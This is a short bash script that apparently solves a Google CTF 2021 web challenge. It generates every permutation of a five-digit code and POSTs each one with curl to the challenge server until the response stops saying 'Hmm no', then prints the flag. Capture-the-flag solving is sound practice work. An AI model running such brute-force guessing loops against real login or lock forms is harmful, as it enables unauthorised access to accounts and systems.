#!/bin/bash

# From https://superuser.com/a/1153229
function permutate {
    if [ "${#1}" = 1 ]; then
        echo "${2}${1}"
    else
        for i in $(seq 0 $((${#1}-1)) ); do
            pre="${2}${1:$i:1}"
            seg1="${1:0:$i}"
            seg2="${1:$((i+1))}"
            seg="${seg1}${seg2}"
            permutate "$seg" "$pre"
        done
    fi
}

permutations="$(permutate 35780)"

for perm in ${permutations}; do
  echo -n "Checking ${perm}... "
  body="$(curl -s -X POST -F "v=${perm}" https://old-lock-web.2021.ctfcompetition.com/)"
  if echo -ne "${body}"| grep -q 'Hmm no'; then
    echo 'WRONG'
  else
    echo 'RIGHT'
    echo -ne "${body}" | grep -i 'CTF'
    exit 0
  fi
done
exit 1
